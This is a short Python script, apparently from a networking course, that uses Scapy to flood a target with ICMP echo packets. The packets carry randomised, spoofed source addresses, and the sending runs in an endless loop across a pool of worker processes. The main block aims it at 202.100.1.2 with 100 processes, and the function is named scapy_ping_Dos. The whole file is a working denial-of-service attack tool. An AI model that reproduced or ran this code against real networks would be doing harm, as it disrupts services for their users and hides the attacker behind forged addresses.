#!/usr/bin/python3.4
# -*- coding=utf-8 -*-
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import multiprocessing
from random import randint
from scapy.all import *
from PyQYT.Network.Tools.Random_IP import Random_IP
def scapy_ping_sendone(host,random_source=True):
	id_ip = randint(1,65535)#随机产生IP ID位
	id_ping = randint(1,65535)#随机产生Ping ID位
	seq_ping = randint(1,65535)#随机产生Ping序列号位
	if random_source == True:
		source_ip = Random_IP()
		packet = IP(src=source_ip, dst=host, ttl=1, id=id_ip)/ICMP(id=id_ping,seq=seq_ping)/b'Welcome to qytang'*100
	else:
		packet = IP(dst=host, ttl=1, id=id_ip)/ICMP(id=id_ping,seq=seq_ping)/b'Welcome to qytang'*100
	ping = send(packet, verbose = False)#获取响应信息，超时为2秒，关闭详细信息

def scapy_ping_10k(host,random_source=True):
	for i in range(10000+1):
		if random_source == True:
			scapy_ping_sendone(host)
		else:
			scapy_ping_sendone(host, random_source=False)

def scapy_ping_Dos(host, processes=5, random_source=True):
	pool = multiprocessing.Pool(processes = processes)
	while True:
		try:
			pool.apply_async(scapy_ping_10k, (host,random_source))
		except KeyboardInterrupt:
			pool.terminate()

if __name__ == '__main__':
	scapy_ping_Dos('202.100.1.2',100)
